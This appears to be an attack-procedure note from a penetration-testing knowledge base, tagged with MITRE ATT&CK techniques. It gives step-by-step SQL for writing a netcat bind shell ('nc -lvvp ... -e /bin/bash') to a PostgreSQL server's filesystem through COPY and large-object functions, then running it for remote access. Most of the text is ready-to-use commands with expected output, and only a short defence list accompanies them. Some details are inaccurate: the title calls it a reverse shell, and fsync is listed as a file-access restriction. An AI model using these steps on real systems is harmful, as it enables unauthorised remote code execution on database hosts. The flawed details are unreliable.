---
id: 502bafd6-f56d-4fbc-8386-f828fccd8d10
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:36.006659+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
  - >-
    [[techniques/File and Directory Permissions Modification|T1222 - File and
    Directory Permissions Modification]]
sub_techniques: []
tags:
  - '[[tags/PostgreSQL File Write]]'
  - '[[tags/PostgreSQL injection]]'
  - rce
  - database-exploitation
commands:
  - '[[commands/postgresql-create-pentestlab-table]]'
  - '[[commands/postgresql-insert-nc-payload-into-pentestlab]]'
  - '[[commands/postgresql-select-from-pentestlab]]'
  - '[[commands/postgresql-copy-pentestlab-to-tmp-pentestlab]]'
  - '[[commands/postgresql-copy-nc-command-to-file]]'
  - '[[commands/postgresql-create-large-object-with-oid]]'
  - '[[commands/postgresql-append-data-to-large-object]]'
  - '[[commands/postgresql-export-data-from-large-object]]'
platforms:
  - Linux
tools: []
validated: true
---

# PostgreSQL-File-Write-with-Reverse-Shell-Payload

## Summary

This procedure demonstrates how to exploit a PostgreSQL database to write a file containing a bind shell payload to the server's filesystem, typically via SQL injection or direct database access with sufficient privileges. The payload is a netcat listener that binds to a port and executes a shell upon connection, providing remote access to the target system. This technique is useful in scenarios where an attacker has gained initial SQL injection access and the database user has file write permissions.

## Description

In this procedure, attackers leverage PostgreSQL's COPY command and large object (LO) functions to write arbitrary text or binary data to files on the server. For a bind shell, the netcat command is written to a file in /tmp, which can then be executed to listen for incoming connections from the attacker's machine. The table-based method involves creating a temporary table, inserting the payload, and copying it to a file. The direct COPY method writes the payload in one step without a table. For binary payloads (e.g., more complex shells), LO functions allow creation, appending, and exporting of data. This assumes the PostgreSQL user (e.g., postgres superuser) has permissions to write to the target directory and execute files. Success enables code execution on the host OS, often Linux, leading to a shell. The target environment is a PostgreSQL server (version 9+ typically) exposed via a web application vulnerable to SQLi or with weak credentials.

## Requirements

1. Access to a PostgreSQL database via SQL injection, valid credentials, or direct psql connection.
2. Database user privileges allowing file writes (e.g., superuser role) and execution of COPY/LO functions.
3. Knowledge of the target server's filesystem paths (e.g., /tmp writable).
4. Attacker machine with netcat listener ready to connect to the bind port.
5. PostgreSQL client tool like psql for execution.

## Defense

- Use parameterized queries and prepared statements in applications to prevent SQL injection.
- Run database services with least privilege: revoke superuser rights and restrict file system access (e.g., via postgresql.conf settings like fsync).
- Enable database logging (log_statement = 'all') and monitor for suspicious queries involving COPY or lo_* functions.
- Implement web application firewalls (WAF) to detect SQLi patterns.
- Regularly audit database permissions and network access to the DB port (5432).
- Use containerization or SELinux/AppArmor to limit DB process file writes.

## Objectives

1. Write a bind shell payload file to the target server's filesystem using PostgreSQL functions.
2. Verify the payload is correctly written and retrievable.
3. Establish a remote shell by executing the written payload and connecting from the attacker machine.
4. Persist or exfiltrate data using the access gained.

## Instructions

### Step 1: Create Temporary Payload Table

**Context**: Begin by creating a simple table to store the bind shell command string. This table acts as a container for the payload before copying it to a file. The table uses a TEXT column to hold the netcat command.

**Command** ([[commands/postgresql-create-pentestlab-table]]):

```sql
CREATE TABLE pentestlab (t TEXT);
```

> This command creates the table if it doesn't exist. It explains the structure for holding string payloads. Run this in a psql session or via injection.

**Expected Output**: A success message like "CREATE TABLE" with no errors. Verify with \dt in psql to see the table listed.

### Step 2: Insert Bind Shell Payload into Table

**Context**: Insert the netcat bind shell command into the table's TEXT column. This payload will listen on a specified port and spawn a bash shell on connection. Customize the port as needed.

**Command** ([[commands/postgresql-insert-nc-payload-into-pentestlab]]):

```sql
INSERT INTO pentestlab(t) VALUES('nc -lvvp $_PORT -e /bin/bash');
```

> The INSERT adds the payload string. The -lvvp flags enable listening (-l), verbose (-v), no DNS (-n implied), port specification (-p), and execute bash (-e). This step prepares the payload for file export.

**Expected Output**: "INSERT 0 1" indicating one row inserted. No errors if table exists.

### Step 3: Verify Payload in Table (Optional)

**Context**: Query the table to confirm the payload string is correctly stored. This step helps debug without writing to disk yet.

**Command** ([[commands/postgresql-select-from-pentestlab]]):

```sql
SELECT * FROM pentestlab;
```

> The SELECT retrieves and displays the inserted payload. Note: This does not execute the shell; it only shows the string.

**Expected Output**: A row displaying the netcat command, e.g., "nc -lvvp 2346 -e /bin/bash".

### Step 4: Copy Table Payload to Server File

**Context**: Export the payload from the table to a file on the server's filesystem. This writes the bind shell command to /tmp/pentestlab, which can later be executed (e.g., via another query or OS access).

**Command** ([[commands/postgresql-copy-pentestlab-to-tmp-pentestlab]]):

```sql
COPY pentestlab(t) TO '$_FILE_PATH';
```

> The COPY command transfers the column data to the specified file path. Ensure the path is writable by the postgres user. After this, the file contains the executable command.

**Expected Output**: "COPY 1" indicating one row copied. Check server logs or access to confirm file creation.

### Step 5: Alternative - Direct Copy of Payload to File

**Context**: For a table-free approach, directly copy a SELECT statement's output (the payload) to a file. This is simpler for single-string writes like the bind shell.

**Code** ([[codes/postgresql-direct-copy-nc-bind-shell-to-file]]):

> Use this code snippet to write the payload in one query. It avoids creating tables, reducing footprint.

**Command** ([[commands/postgresql-copy-nc-command-to-file]]):

```sql
COPY (SELECT 'nc -lvvp $_PORT -e /bin/bash') TO '$_FILE_PATH';
```

> This executes the SELECT inline and copies its result to the file. Ideal for quick writes via injection.

**Expected Output**: "COPY 1" with the file containing the netcat command.

### Step 6: Create Large Object for Binary Payload

**Context**: For binary data (e.g., complex shell scripts), create a large object using lo_from_bytea. This stores data with an OID for later manipulation. Replace placeholders with actual binary data (e.g., encoded shellcode).

**Command** ([[commands/postgresql-create-large-object-with-oid]]):

```sql
SELECT lo_from_bytea($_OID, $_BYTEA_DATA);
```

> lo_from_bytea creates the LO and returns the OID. Use this for payloads too large for simple COPY.

**Expected Output**: The OID value (e.g., 12345) if successful.

### Step 7: Append Data to Large Object (If Needed)

**Context**: If the payload is chunked, append additional data to the LO at a specific offset. This builds larger files incrementally.

**Command** ([[commands/postgresql-append-data-to-large-object]]):

```sql
SELECT lo_put($_OID, $_OFFSET, $_DATA);
```

> lo_put modifies the LO. Start offset at 0 for initial appends.

**Expected Output**: 1 (success) or 0 (failure).

### Step 8: Export Large Object to File

**Context**: Write the complete LO to a server file, similar to COPY but for binary data.

**Command** ([[commands/postgresql-export-data-from-large-object]]):

```sql
SELECT lo_export($_OID, '$_FILE_PATH');
```

> lo_export dumps the LO contents to the path. Use after creation/append.

**Expected Output**: 1 if exported successfully.

### Step 9: Execute Written Payload

**Context**: After writing, make the file executable and run it to start the bind shell. This may require additional privileges or another exploitation vector.

**Instructions**: Assuming file is written, use another SQL command or OS access: chmod +x /tmp/pentestlab; /tmp/pentestlab. On attacker side, nc target_ip $_PORT to connect.

**Expected Output**: Shell prompt on connection. Success: Remote code execution on target.
